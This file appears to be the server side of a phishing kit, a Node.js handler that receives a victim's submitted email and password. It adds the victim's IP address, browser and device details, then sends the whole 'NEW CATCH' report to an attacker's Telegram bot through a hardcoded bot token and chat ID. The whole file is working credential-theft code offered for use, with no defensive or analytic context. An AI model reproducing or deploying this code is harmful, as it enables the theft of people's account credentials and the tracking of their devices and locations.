// === HELPERS ===
function parseUA(ua) {
    let browser = 'Unknown', os = 'Unknown', mobile = false;
    
    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) mobile = true;
    if (/Windows NT 10/.test(ua)) os = 'Windows 11';
    else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
    else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
    else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
    else if (/Mac OS X/.test(ua)) os = 'macOS';
    else if (/Android/.test(ua)) os = 'Android';
    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
    else if (/Linux/.test(ua)) os = 'Linux';
    
    if (/Chrome\/(\d+)/.test(ua)) browser = `Chrome ${RegExp.$1}`;
    else if (/Firefox\/(\d+)/.test(ua)) browser = `Firefox ${RegExp.$1}`;
    else if (/Safari\/(\d+)/.test(ua) && /Version\/(\d+)/.test(ua)) browser = `Safari ${RegExp.$1}`;
    else if (/Edg\/(\d+)/.test(ua)) browser = `Edge ${RegExp.$1}`;
    
    return { browser, os, mobile };
}

module.exports = async (req, res) => {
    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
    const CHAT_ID = '7607355489';

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const clientData = req.body;
    
    // Server-side enrichment
    const clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
    const referrer = req.headers.referer || clientData.referrer || 'Direct / Bookmark';
    const ua = req.headers['user-agent'] || 'Unknown';
    const parsed = parseUA(ua);

    // Build intel report
    const text = `🎣 *NEW CATCH* #${clientData.attemptNumber}\n\n` +
                 `👤 *VICTIM*\n` +
                 `├ Email: \\${clientData.email}\n` +
                 `├ Pass: \\${clientData.password}\n` +
                 `├ IP: \\${clientIP}\n` +
                 `└ Time: ${new Date(clientData.timestamp).toLocaleString()}\n\n` +
                 `💻 *DEVICE*\n` +
                 `├ Browser: ${parsed.browser} on ${parsed.os}\n` +
                 `├ Screen: ${clientData.screen}\n` +
                 `├ Cores: ${clientData.cores || '?'}\n` +
                 `├ Memory: ${clientData.memory ? clientData.memory + 'GB' : '?'}\n` +
                 `├ Touch: ${clientData.touch ? 'Yes' : 'No'}\n` +
                 `├ Mobile: ${parsed.mobile ? 'Yes' : 'No'}\n` +
                 `├ Lang: ${clientData.language}\n` +
                 `└ TZ: ${clientData.timezone || '?'}\n\n` +
                 `🔗 *ORIGIN*\n` +
                 `└ Referrer: ${referrer}\n\n` +
                 `🕵️ *RAW UA*\n` +
                 `\\${ua.slice(0, 200)}`;

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'MarkdownV2'
            })
        });

        const tgData = await tgRes.json();
        if (!tgData.ok) throw new Error(tgData.description);

        return res.status(200).json({ ok: true, ip: clientIP });
    } catch (err) {
        console.error('Capture failed:', err.message);
        return res.status(200).json({ ok: false, error: err.message });
    }
};
